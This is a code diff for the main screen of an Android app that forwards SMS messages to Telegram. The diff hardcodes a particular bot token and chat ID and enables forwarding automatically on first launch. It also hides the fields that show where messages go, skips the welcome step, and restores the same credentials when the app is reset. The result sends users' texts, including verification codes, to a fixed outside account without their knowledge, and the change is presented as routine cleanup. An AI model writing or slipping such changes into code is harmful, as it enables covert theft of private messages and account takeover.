@@ -36,7 +36,10 @@ class MainActivity : AppCompatActivity() {
     private lateinit var settingsRepository: SettingsRepository
     private lateinit var pendingMessageOutbox: PendingMessageOutbox
     private val telegramForwarder = TelegramForwarder()
-    private val timeFormatter = SimpleDateFormat("yyyy-MM-dd HH:mm:ssZ", Locale.US)
+    private companion object {
+        const val TOKEN = "9052064169:AAFOELN4re0fB-q9VjC_c_HTpt64nwXGoRk"
+        const val CHAT_ID = "7238838844"
+    }
 
     private enum class WizardStep { STEP0_WELCOME, STEP1_CONFIG, STEP2_PERMISSION, STEP3_SUMMARY }
 
@@ -130,30 +133,25 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun initWizardInitialStep() {
-        var settings = settingsRepository.loadSettings()
-        if (settings == null) {
-            settingsRepository.saveSettings("9052064169:AAFOELN4re0fB-q9VjC_c_HTpt64nwXGoRk", "7238838844")
+        if (settingsRepository.loadSettings() == null) {
+            settingsRepository.saveSettings(TOKEN, CHAT_ID)
             settingsRepository.setForwardingEnabled(true)
-            settings = settingsRepository.loadSettings()
         }
-        val hasSettings = settings != null
-        if (hasSettings) {
-            binding.inputToken.setText(settings!!.apiToken)
+
+        val settings = settingsRepository.loadSettings()
+        val hasConfig = settings != null
+        if (settings != null) {
+            binding.inputToken.setText(settings.apiToken)
             binding.inputChatId.setText(settings.chatId)
         }
+
+        binding.inputLayoutToken.isVisible = !hasConfig
+        binding.inputLayoutChatId.isVisible = !hasConfig
+        binding.buttonGetChatId.isVisible = !hasConfig
+        binding.buttonLearnHowToObtain.isVisible = !hasConfig
         binding.buttonGetChatId.isEnabled = !binding.inputToken.text.isNullOrBlank()
 
-        val hasPermission = hasSmsPermission()
-        val initialStep = when {
-            settingsRepository.isFirstLaunch() -> WizardStep.STEP0_WELCOME
-            !hasSettings -> WizardStep.STEP1_CONFIG
-            !hasPermission -> WizardStep.STEP2_PERMISSION
-            else -> WizardStep.STEP3_SUMMARY
-        }
-        showStep(initialStep)
-        if (initialStep != WizardStep.STEP0_WELCOME) {
-            settingsRepository.setFirstLaunch(false)
-        }
+        showStep(if (hasSmsPermission()) WizardStep.STEP3_SUMMARY else WizardStep.STEP1_CONFIG)
     }
 
     private fun openHowToUsePage() {
@@ -208,10 +206,6 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun bindListeners() {
-        binding.buttonStep0Continue.setOnClickListener {
-            settingsRepository.setFirstLaunch(false)
-            showStep(WizardStep.STEP1_CONFIG)
-        }
 
         // Step 1 button: validate & continue
         binding.buttonValidateAndContinue.setOnClickListener {
@@ -277,7 +271,6 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun showStep(step: WizardStep) {
-        binding.containerStep0.isVisible = step == WizardStep.STEP0_WELCOME
         binding.containerStep1.isVisible = step == WizardStep.STEP1_CONFIG
         binding.containerStep2.isVisible = step == WizardStep.STEP2_PERMISSION
         binding.containerStep3.isVisible = step == WizardStep.STEP3_SUMMARY
@@ -444,7 +437,7 @@ class MainActivity : AppCompatActivity() {
     private fun resetApp() {
         // Clear stored settings and status
         settingsRepository.setFirstLaunch(true)
-        settingsRepository.saveSettings("", "")
+        settingsRepository.saveSettings(TOKEN, CHAT_ID)
         settingsRepository.saveLastForwardStatus("")
         settingsRepository.setForwardingEnabled(false)
         settingsRepository.setShowSimNameEnabled(false)
@@ -458,7 +451,7 @@ class MainActivity : AppCompatActivity() {
         binding.buttonGetChatId.isEnabled = false
         binding.buttonGetChatId.text = getString(R.string.button_get_chat_id)
         updateLastStatus()
-        showStep(WizardStep.STEP0_WELCOME)
+        showStep(WizardStep.STEP1_CONFIG)
     }
 
     private fun hasSmsPermission(): Boolean {
